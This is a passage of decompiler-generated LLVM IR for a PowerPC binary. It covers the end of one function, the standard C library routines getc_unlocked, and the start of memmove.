  br i1 %tmp82, label %dec_label_pc_10008210, label %dec_label_pc_100081b4

dec_label_pc_100081b4:                            ; preds = %dec_label_pc_10008188
  %v3_100081b4 = load i32, i32* %v2_10007bf0, align 4
  store i32 %v3_100081b4, i32* %r0.global-to-local, align 4
  %v1_100081b8 = and i32 %v3_100081b4, 8
  store i32 %v1_100081b8, i32* @r7, align 4
  %v3_100081b8 = icmp eq i32 %v1_100081b8, 0
  br i1 %v3_100081b8, label %dec_label_pc_100081dc, label %dec_label_pc_100081c0

dec_label_pc_100081c0:                            ; preds = %dec_label_pc_100081b4
  %v1_100081c4 = add i32 %v0_100081ec, 12
  store i32 %v1_100081c4, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_1000cf43.431 to i32), i32* %r9.global-to-local, align 4
  %v2_100081cc = inttoptr i32 %v0_100081ec to i32*
  store i32 160, i32* %v2_100081cc, align 4
  %v0_100081d0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100081d0 = load i32, i32* %r8.global-to-local, align 4
  %v2_100081d0 = add i32 %v1_100081d0, 4
  %v3_100081d0 = inttoptr i32 %v2_100081d0 to i32*
  store i32 %v0_100081d0, i32* %v3_100081d0, align 4
  %v0_100081d4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100081d4 = load i32, i32* %r8.global-to-local, align 4
  %v2_100081d4 = add i32 %v1_100081d4, 8
  %v3_100081d4 = inttoptr i32 %v2_100081d4 to i32*
  store i32 %v0_100081d4, i32* %v3_100081d4, align 4
  br label %dec_label_pc_10008210

dec_label_pc_100081dc:                            ; preds = %dec_label_pc_100081b4
  %v1_100081dc = add i32 %tmp, 16
  %v2_100081dc = inttoptr i32 %v1_100081dc to i32*
  %v3_100081dc = load i32, i32* %v2_100081dc, align 4
  store i32 %v3_100081dc, i32* %r0.global-to-local, align 4
  %v1_100081e0 = icmp slt i32 %v3_100081dc, 48
  %v3_100081e0 = icmp eq i32 %v3_100081dc, 48
  store i1 %v1_100081e0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100081e0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100081e0, label %dec_label_pc_100081e8, label %dec_label_pc_10008204

dec_label_pc_100081e8:                            ; preds = %dec_label_pc_100081dc
  %v3_100081e8 = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_100081ec, i32* @r30, align 4
  %v2_100081f0 = add i32 %v3_100081e8, %v2_100081a4
  store i32 %v2_100081f0, i32* %r0.global-to-local, align 4
  store i32 %v2_100081f0, i32* %stack_var_-140, align 4
  br label %dec_label_pc_10008210

dec_label_pc_100081fc:                            ; preds = %dec_label_pc_10008218
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_1000824c

dec_label_pc_10008204:                            ; preds = %dec_label_pc_100081dc
  store i32 %v2_10008180, i32* %r0.global-to-local, align 4
  store i32 %v0_100081ec, i32* @r30, align 4
  br label %dec_label_pc_10008210

dec_label_pc_10008210:                            ; preds = %dec_label_pc_10008188, %dec_label_pc_100081e8, %dec_label_pc_100081c0, %dec_label_pc_10008204
  store i32 0, i32* @r29, align 4
  %v2_10008214 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_10008214, i32* @r31, align 4
  br label %dec_label_pc_10008218

dec_label_pc_10008218:                            ; preds = %dec_label_pc_10008248, %dec_label_pc_10008210
  %v0_10008228 = phi i32 [ %v1_10008234, %dec_label_pc_10008248 ], [ %v2_10008214, %dec_label_pc_10008210 ]
  %v1_10008218 = inttoptr i32 %v0_10008228 to i32*
  %v2_10008218 = load i32, i32* %v1_10008218, align 4
  store i32 %v2_10008218, i32* %r4.global-to-local, align 4
  %v0_1000821c = load i32, i32* @r27, align 4
  store i32 %v0_1000821c, i32* %r3.global-to-local, align 4
  %v1_10008220 = add i32 %v0_10008228, 4
  %v2_10008220 = inttoptr i32 %v1_10008220 to i32*
  %v3_10008220 = load i32, i32* %v2_10008220, align 4
  store i32 %v3_10008220, i32* %r5.global-to-local, align 4
  %v0_10008224 = load i32, i32* @r26, align 4
  store i32 %v0_10008224, i32* %ctr.global-to-local, align 4
  %v1_10008228 = add i32 %v0_10008228, 8
  %v2_10008228 = inttoptr i32 %v1_10008228 to i32*
  %v3_10008228 = load i32, i32* %v2_10008228, align 4
  store i32 %v3_10008228, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_10008224)
  %v0_10008230 = load i32, i32* @r31, align 4
  %v1_10008230 = add i32 %v0_10008230, 4
  %v2_10008230 = inttoptr i32 %v1_10008230 to i32*
  %v3_10008230 = load i32, i32* %v2_10008230, align 4
  store i32 %v3_10008230, i32* %r0.global-to-local, align 4
  %v1_10008234 = add i32 %v0_10008230, 12
  store i32 %v1_10008234, i32* @r31, align 4
  %v0_10008238 = load i32, i32* @r29, align 4
  %v1_10008238 = load i32, i32* %r3.global-to-local, align 4
  %v2_10008238 = add i32 %v1_10008238, %v0_10008238
  store i32 %v2_10008238, i32* @r29, align 4
  %v2_1000823c = icmp slt i32 %v1_10008238, %v3_10008230
  %v4_1000823c = icmp eq i32 %v1_10008238, %v3_10008230
  store i1 %v2_1000823c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000823c, i1* %cr7_eq.global-to-local, align 1
  %v1_10008240 = load i32, i32* @r30, align 4
  %v2_10008240 = icmp ult i32 %v1_10008234, %v1_10008240
  %v3_10008240 = icmp ugt i32 %v1_10008234, %v1_10008240
  %v4_10008240 = icmp eq i32 %v1_10008234, %v1_10008240
  store i1 %v2_10008240, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_10008240, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_10008240, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_1000823c, label %dec_label_pc_10008248, label %dec_label_pc_100081fc

dec_label_pc_10008248:                            ; preds = %dec_label_pc_10008218
  br i1 %v2_10008240, label %dec_label_pc_10008218, label %dec_label_pc_1000824c

dec_label_pc_1000824c:                            ; preds = %dec_label_pc_10008248, %dec_label_pc_100081fc
  %v0_10008250 = phi i32 [ -1, %dec_label_pc_100081fc ], [ %v2_10008238, %dec_label_pc_10008248 ]
  store i32 %v0_10007ba0, i32* %r0.global-to-local, align 4
  store i32 %v0_10008250, i32* %r3.global-to-local, align 4
  ret i32 %v0_10008250

; uselistorder directives
  uselistorder i32 %v0_10008250, { 1, 0 }
  uselistorder i32 %v1_10008238, { 2, 1, 0 }
  uselistorder i32 %v1_10008234, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v3_10008230, { 1, 0, 2 }
  uselistorder i32 %v0_10008228, { 0, 2, 1 }
  uselistorder i32 %v3_100081dc, { 1, 0, 2 }
  uselistorder i32 %v1_1000819c, { 1, 0 }
  uselistorder i32 %v2_10008180, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10008178, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10008174, { 1, 0 }
  uselistorder i32 %v0_100081ec, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_10008140, { 1, 2, 0 }
  uselistorder i32 %v1_10008124, { 1, 0, 2 }
  uselistorder i32 %v2_10008120, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_100080f0, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_100080c0, { 2, 0, 1 }
  uselistorder i32 %v2_100080bc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000802c, { 1, 0 }
  uselistorder i32 %v2_10007f90, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_10007f64, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_10007f2c, { 3, 0, 1, 2 }
  uselistorder i32 %v0_10007f24, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_10007ef0, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_10007ee0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_10007ed4, { 1, 0, 2 }
  uselistorder i32 %v1_10007eb8, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10007e70, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_10007e60, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10007e44, { 1, 0 }
  uselistorder i32 %v1_10007e20, { 1, 0 }
  uselistorder i32 %v2_10007e00, { 1, 0, 2 }
  uselistorder i32 %v0_10007da8, { 1, 0 }
  uselistorder i32 %v1_10007c0c, { 1, 0 }
  uselistorder i32 %v0_10007c98, { 2, 1, 0 }
  uselistorder i32 %v1_10007be0, { 1, 0 }
  uselistorder i32 %v1_10007bc0, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 36, 37, 0, 8, 9, 10, 11, 1, 12, 13, 14, 2, 15, 16, 17, 3, 18, 19, 20, 4, 21, 22, 23, 5, 6, 7, 24, 27, 25, 28, 29, 26, 31, 30, 32, 33, 34, 35, 38 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 11, 9, 10, 12, 13, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 4, 5, 0, 6, 1, 7, 3, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 17, 15, 18, 16, 19, 20, 21, 22 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 8, 11, 14, 12, 13, 15, 16, 17, 19, 18 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41 }
  uselistorder i1* %cr7_lt.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr7_eq.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 4, 2, 1 }
  uselistorder i32 112, { 2, 3, 0, 1, 4 }
  uselistorder i32 176, { 1, 2, 0, 3 }
  uselistorder i8 48, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 -2147483648, { 9, 0, 1, 11, 10, 2, 4, 3, 12, 6, 5, 13, 8, 7, 14 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1000cf40.429 to i32), { 2, 0, 1 }
  uselistorder i32 43, { 1, 0 }
  uselistorder label %dec_label_pc_10008210, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10008170, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008120.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000810c, { 1, 0 }
  uselistorder label %dec_label_pc_100080e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100080bc, { 1, 0 }
  uselistorder label %dec_label_pc_100080a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000808c, { 1, 0 }
  uselistorder label %dec_label_pc_10008064, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008044, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008020, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10008004, { 1, 0 }
  uselistorder label %dec_label_pc_10007f74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007f10, { 1, 0 }
  uselistorder label %dec_label_pc_10007ed0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10007e94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007e68, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10007e48, { 1, 0 }
  uselistorder label %dec_label_pc_10007dd4, { 1, 0 }
  uselistorder label %dec_label_pc_10007cc4, { 1, 0 }
  uselistorder label %dec_label_pc_10007c1c, { 1, 0 }
  uselistorder label %dec_label_pc_10007bf0, { 1, 0 }
  uselistorder label %dec_label_pc_10007be4, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_10008264 = load i32, i32* @lr, align 4
  store i32 %v0_10008264, i32* %r0.global-to-local, align 4
  %v0_1000826c = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10008278 = add i32 %tmp, 16
  %v3_10008278 = inttoptr i32 %v2_10008278 to i32*
  %v4_10008278 = load i32, i32* %v3_10008278, align 4
  store i32 %v4_10008278, i32* %r9.global-to-local, align 4
  %v2_1000827c = add i32 %tmp, 24
  %v3_1000827c = inttoptr i32 %v2_1000827c to i32*
  %v4_1000827c = load i32, i32* %v3_1000827c, align 4
  store i32 %v4_1000827c, i32* %r0.global-to-local, align 4
  %v2_10008280 = icmp ult i32 %v4_10008278, %v4_1000827c
  br i1 %v2_10008280, label %dec_label_pc_100082e8, label %dec_label_pc_10008288

dec_label_pc_10008288:                            ; preds = %entry
  %v3_10008288 = load i16, i16* %arg1, align 2
  %v4_10008288 = zext i16 %v3_10008288 to i32
  %v1_1000828c = and i32 %v4_10008288, 131
  store i32 %v1_1000828c, i32* %r0.global-to-local, align 4
  %v2_10008290 = icmp ugt i32 %v1_1000828c, 128
  br i1 %v2_10008290, label %dec_label_pc_100082a8, label %dec_label_pc_10008298

dec_label_pc_10008298:                            ; preds = %dec_label_pc_10008288
  store i32 268468896, i32* @lr, align 4
  %v3_1000829c = call i32 @__stdio_trans2r_o(i16* inttoptr (i32 128 to i16*), i32 %v4_10008278)
  store i32 %v3_1000829c, i32* %r3.global-to-local, align 4
  %v3_100082a0 = icmp eq i32 %v3_1000829c, 0
  br i1 %v3_100082a0, label %dec_label_pc_10008298.dec_label_pc_100082a8_crit_edge, label %dec_label_pc_10008384

dec_label_pc_10008298.dec_label_pc_100082a8_crit_edge: ; preds = %dec_label_pc_10008298
  %v0_100082a8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100082a8

dec_label_pc_100082a8:                            ; preds = %dec_label_pc_10008298.dec_label_pc_100082a8_crit_edge, %dec_label_pc_10008288
  %v2_10008308 = phi i32 [ %v0_100082a8.pre, %dec_label_pc_10008298.dec_label_pc_100082a8_crit_edge ], [ %tmp, %dec_label_pc_10008288 ]
  %v1_100082a8 = inttoptr i32 %v2_10008308 to i16*
  %v2_100082a8 = load i16, i16* %v1_100082a8, align 2
  %v3_100082a8 = zext i16 %v2_100082a8 to i32
  %v1_100082ac = and i32 %v3_100082a8, 2
  store i32 %v1_100082ac, i32* %r0.global-to-local, align 4
  %v3_100082ac = icmp eq i32 %v1_100082ac, 0
  br i1 %v3_100082ac, label %dec_label_pc_100082d8, label %dec_label_pc_100082b4

dec_label_pc_100082b4:                            ; preds = %dec_label_pc_100082a8
  %v1_100082b4 = call i32 @__asm_rlwinm(i32 %v3_100082a8, i32 2, i32 29, i32 29)
  %v1_100082b8 = load i32, i32* @r31, align 4
  %v2_100082b8 = add i32 %v1_100082b8, %v1_100082b4
  store i32 %v2_100082b8, i32* %r9.global-to-local, align 4
  %v1_100082bc = add i32 %v2_100082b8, 39
  %v2_100082bc = inttoptr i32 %v1_100082bc to i8*
  %v3_100082bc = load i8, i8* %v2_100082bc, align 1
  %v4_100082bc = zext i8 %v3_100082bc to i32
  store i32 %v4_100082bc, i32* %r0.global-to-local, align 4
  %v1_100082c0 = add nsw i32 %v3_100082a8, -1
  store i32 %v1_100082c0, i32* %r9.global-to-local, align 4
  %v1_100082c4 = trunc i32 %v1_100082c0 to i16
  %v3_100082c4 = inttoptr i32 %v1_100082b8 to i16*
  store i16 %v1_100082c4, i16* %v3_100082c4, align 2
  %v0_100082c8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_100082c8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100082d0 = load i32, i32* @r31, align 4
  %v2_100082d0 = add i32 %v1_100082d0, 40
  %v3_100082d0 = inttoptr i32 %v2_100082d0 to i32*
  store i32 0, i32* %v3_100082d0, align 4
  br label %dec_label_pc_10008388

dec_label_pc_100082d8:                            ; preds = %dec_label_pc_100082a8
  %v1_100082d8 = add i32 %v2_10008308, 16
  %v2_100082d8 = inttoptr i32 %v1_100082d8 to i32*
  %v3_100082d8 = load i32, i32* %v2_100082d8, align 4
  store i32 %v3_100082d8, i32* %r9.global-to-local, align 4
  %v1_100082dc = add i32 %v2_10008308, 20
  %v2_100082dc = inttoptr i32 %v1_100082dc to i32*
  %v3_100082dc = load i32, i32* %v2_100082dc, align 4
  store i32 %v3_100082dc, i32* %r0.global-to-local, align 4
  %v4_100082e0 = icmp eq i32 %v3_100082dc, %v3_100082d8
  br i1 %v4_100082e0, label %dec_label_pc_100082f4, label %dec_label_pc_100082e8

dec_label_pc_100082e8:                            ; preds = %dec_label_pc_100082d8, %entry
  %v1_1000835c7 = phi i32 [ %v2_10008308, %dec_label_pc_100082d8 ], [ %tmp, %entry ]
  %v0_100082e8 = phi i32 [ %v3_100082d8, %dec_label_pc_100082d8 ], [ %v4_10008278, %entry ]
  %v1_100082e8 = inttoptr i32 %v0_100082e8 to i8*
  %v2_100082e8 = load i8, i8* %v1_100082e8, align 1
  %v3_100082e8 = zext i8 %v2_100082e8 to i32
  store i32 %v3_100082e8, i32* %r3.global-to-local, align 4
  %v1_100082ec = add i32 %v0_100082e8, 1
  store i32 %v1_100082ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000835c

dec_label_pc_100082f4:                            ; preds = %dec_label_pc_100082d8
  %v1_100082f4 = add i32 %v2_10008308, 4
  %v2_100082f4 = inttoptr i32 %v1_100082f4 to i32*
  %v3_100082f4 = load i32, i32* %v2_100082f4, align 4
  store i32 %v3_100082f4, i32* %r0.global-to-local, align 4
  %v3_100082f8 = icmp eq i32 %v3_100082f4, -2
  br i1 %v3_100082f8, label %dec_label_pc_10008300, label %dec_label_pc_10008310

dec_label_pc_10008300:                            ; preds = %dec_label_pc_100082f4
  %v1_10008300 = or i32 %v3_100082a8, 4
  store i32 %v1_10008300, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10008308 = trunc i32 %v1_10008300 to i16
  store i16 %v1_10008308, i16* %v1_100082a8, align 2
  br label %dec_label_pc_10008388

dec_label_pc_10008310:                            ; preds = %dec_label_pc_100082f4
  %v1_10008310 = and i32 %v3_100082a8, 768
  store i32 %v1_10008310, i32* %r0.global-to-local, align 4
  %v3_10008310 = icmp eq i32 %v1_10008310, 0
  br i1 %v3_10008310, label %dec_label_pc_10008324, label %dec_label_pc_10008318

dec_label_pc_10008318:                            ; preds = %dec_label_pc_10008310
  store i32 ptrtoint (i32** @global_var_1001d7f4.350 to i32), i32* %r3.global-to-local, align 4
  store i32 268469028, i32* @lr, align 4
  %v4_10008320 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_1001d7f4.350 to i16*), i32 %v3_100082d8)
  store i32 %v4_10008320, i32* %r3.global-to-local, align 4
  %v0_10008324.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008324

dec_label_pc_10008324:                            ; preds = %dec_label_pc_10008310, %dec_label_pc_10008318
  %v0_10008364 = phi i32 [ %v2_10008308, %dec_label_pc_10008310 ], [ %v0_10008324.pre, %dec_label_pc_10008318 ]
  %v1_10008324 = add i32 %v0_10008364, 8
  %v2_10008324 = inttoptr i32 %v1_10008324 to i32*
  %v3_10008324 = load i32, i32* %v2_10008324, align 4
  store i32 %v3_10008324, i32* %r9.global-to-local, align 4
  %v1_10008328 = add i32 %v0_10008364, 12
  %v2_10008328 = inttoptr i32 %v1_10008328 to i32*
  %v3_10008328 = load i32, i32* %v2_10008328, align 4
  store i32 %v3_10008328, i32* %r0.global-to-local, align 4
  %v4_1000832c = icmp eq i32 %v3_10008328, %v3_10008324
  br i1 %v4_1000832c, label %dec_label_pc_10008364, label %dec_label_pc_10008334

dec_label_pc_10008334:                            ; preds = %dec_label_pc_10008324
  %v2_10008334 = add i32 %v0_10008364, 24
  %v3_10008334 = inttoptr i32 %v2_10008334 to i32*
  store i32 %v3_10008324, i32* %v3_10008334, align 4
  %v0_10008338 = load i32, i32* @r31, align 4
  store i32 %v0_10008338, i32* %r3.global-to-local, align 4
  store i32 268469056, i32* @lr, align 4
  %v3_1000833c = call i32 @__stdio_rfill(i32 %v0_10008338, i32 %v3_10008324)
  store i32 %v3_1000833c, i32* %r3.global-to-local, align 4
  %v3_10008340 = icmp eq i32 %v3_1000833c, 0
  br i1 %v3_10008340, label %dec_label_pc_10008384, label %dec_label_pc_10008348

dec_label_pc_10008348:                            ; preds = %dec_label_pc_10008334
  %v0_10008348 = load i32, i32* @r31, align 4
  %v1_10008348 = add i32 %v0_10008348, 20
  %v2_10008348 = inttoptr i32 %v1_10008348 to i32*
  %v3_10008348 = load i32, i32* %v2_10008348, align 4
  store i32 %v3_10008348, i32* %r0.global-to-local, align 4
  %v1_1000834c = add i32 %v0_10008348, 16
  %v2_1000834c = inttoptr i32 %v1_1000834c to i32*
  %v3_1000834c = load i32, i32* %v2_1000834c, align 4
  store i32 %v3_1000834c, i32* %r9.global-to-local, align 4
  %v2_10008350 = add i32 %v0_10008348, 24
  %v3_10008350 = inttoptr i32 %v2_10008350 to i32*
  store i32 %v3_10008348, i32* %v3_10008350, align 4
  %v0_10008354 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008354 = add i32 %v0_10008354, 1
  store i32 %v1_10008354, i32* %r0.global-to-local, align 4
  %v1_10008358 = inttoptr i32 %v0_10008354 to i8*
  %v2_10008358 = load i8, i8* %v1_10008358, align 1
  %v3_10008358 = zext i8 %v2_10008358 to i32
  store i32 %v3_10008358, i32* %r3.global-to-local, align 4
  %v1_1000835c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000835c

dec_label_pc_1000835c:                            ; preds = %dec_label_pc_100082e8, %dec_label_pc_10008348
  %v1_1000835c = phi i32 [ %v1_1000835c7, %dec_label_pc_100082e8 ], [ %v1_1000835c.pre, %dec_label_pc_10008348 ]
  %v0_1000835c = phi i32 [ %v1_100082ec, %dec_label_pc_100082e8 ], [ %v1_10008354, %dec_label_pc_10008348 ]
  %v2_1000835c = add i32 %v1_1000835c, 16
  %v3_1000835c = inttoptr i32 %v2_1000835c to i32*
  store i32 %v0_1000835c, i32* %v3_1000835c, align 4
  br label %dec_label_pc_10008388

dec_label_pc_10008364:                            ; preds = %dec_label_pc_10008324
  %v1_10008364 = inttoptr i32 %v0_10008364 to i16*
  store i32 %v0_10008364, i32* %r3.global-to-local, align 4
  %v2_10008368 = ptrtoint i8* %stack_var_-24 to i32
  store i32 268469108, i32* @lr, align 4
  %v5_10008370 = call i32 @__stdio_READ(i16* %v1_10008364, i32 %v2_10008368, i32 1)
  store i32 %v5_10008370, i32* %r3.global-to-local, align 4
  %v3_10008374 = icmp eq i32 %v5_10008370, 0
  br i1 %v3_10008374, label %dec_label_pc_10008384, label %dec_label_pc_1000837c

dec_label_pc_1000837c:                            ; preds = %dec_label_pc_10008364
  %v3_1000837c = load i8, i8* %stack_var_-24, align 1
  %v4_1000837c = sext i8 %v3_1000837c to i32
  store i32 %v4_1000837c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008388

dec_label_pc_10008384:                            ; preds = %dec_label_pc_10008298, %dec_label_pc_10008364, %dec_label_pc_10008334
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008388

dec_label_pc_10008388:                            ; preds = %dec_label_pc_1000837c, %dec_label_pc_1000835c, %dec_label_pc_10008300, %dec_label_pc_100082b4, %dec_label_pc_10008384
  store i32 %v0_10008264, i32* %r0.global-to-local, align 4
  store i32 %v0_1000826c, i32* @r31, align 4
  %v0_10008398 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10008398

; uselistorder directives
  uselistorder i32 %v0_10008364, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_100082e8, { 1, 0 }
  uselistorder i32 %v3_100082d8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_100082b8, { 1, 0 }
  uselistorder i32 %v3_100082a8, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v2_10008308, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i16* bitcast (i32** @global_var_1001d7f4.350 to i16*), { 1, 0 }
  uselistorder i16* @global_var_1001d4cc.284, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10008388, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10008384, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000835c, { 1, 0 }
  uselistorder label %dec_label_pc_10008324, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_1000839c = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v0_100083a4 = load i32, i32* @r5, align 4
  store i32 %v0_100083a4, i32* @r11, align 4
  br i1 %v2_1000839c, label %dec_label_pc_100083b0, label %dec_label_pc_100083ac

dec_label_pc_100083ac:                            ; preds = %entry
  %v0_100083ac = call i32 @memcpy()
  store i32 %v0_100083ac, i32* @r3, align 4
  %v0_100083b0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_100083b0

dec_label_pc_100083b0:                            ; preds = %entry, %dec_label_pc_100083ac
  %v0_100083b0 = phi i32 [ %v0_100083a4, %entry ], [ %v0_100083b0.pre, %dec_label_pc_100083ac ]
  %v1_100083b0 = call i32 @__asm_rlwinm.(i32 %v0_100083b0, i32 29, i32 3, i32 31)
  store i32 %v1_100083b0, i32* %r9.global-to-local, align 4
  %v4_100083b0 = icmp eq i32 %v1_100083b0, 0
  %v1_100083b4 = load i32, i32* @r5, align 4
  %v2_100083b4 = add i32 %v1_100083b4, %arg2
  store i32 %v2_100083b4, i32* %r4.global-to-local, align 4
  %v0_100083b8 = load i32, i32* @r3, align 4
  %v2_100083b8 = add i32 %v0_100083b8, %v1_100083b4
  store i32 %v2_100083b8, i32* %r10.global-to-local, align 4
  br i1 %v4_100083b0, label %dec_label_pc_100083e0, label %dec_label_pc_100083c0

dec_label_pc_100083c0:                            ; preds = %dec_label_pc_100083b0
  %v1_100083c0 = urem i32 %v2_100083b8, 4
  %v3_100083c0 = icmp eq i32 %v1_100083c0, 0
  br i1 %v3_100083c0, label %dec_label_pc_100083c8, label %dec_label_pc_10008414

dec_label_pc_100083c8:                            ; preds = %dec_label_pc_1000842c.dec_label_pc_100083c8_crit_edge, %dec_label_pc_100083c0
  %v1_100083d4.pre = phi i32 [ %v1_100083d4.pre.pre, %dec_label_pc_1000842c.dec_label_pc_100083c8_crit_edge ], [ %v2_100083b8, %dec_label_pc_100083c0 ]
  %v0_100083c8 = phi i32 [ %v1_1000842c, %dec_label_pc_1000842c.dec_label_pc_100083c8_crit_edge ], [ %v1_100083b0, %dec_label_pc_100083c0 ]
  store i32 %v0_100083c8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100083cc

dec_label_pc_100083cc:                            ; preds = %dec_label_pc_100083cc, %dec_label_pc_100083c8
  %v1_100083d4 = phi i32 [ %v2_100083d8, %dec_label_pc_100083cc ], [ %v1_100083d4.pre, %dec_label_pc_100083c8 ]
  %v0_100083cc = load i32, i32* %r4.global-to-local, align 4
  %v1_100083cc = add i32 %v0_100083cc, -4
  %v2_100083cc = inttoptr i32 %v1_100083cc to i32*
  %v3_100083cc = load i32, i32* %v2_100083cc, align 4
  %v1_100083d0 = add i32 %v0_100083cc, -8
  %v2_100083d0 = inttoptr i32 %v1_100083d0 to i32*
  %v3_100083d0 = load i32, i32* %v2_100083d0, align 4
  store i32 %v3_100083d0, i32* %r9.global-to-local, align 4
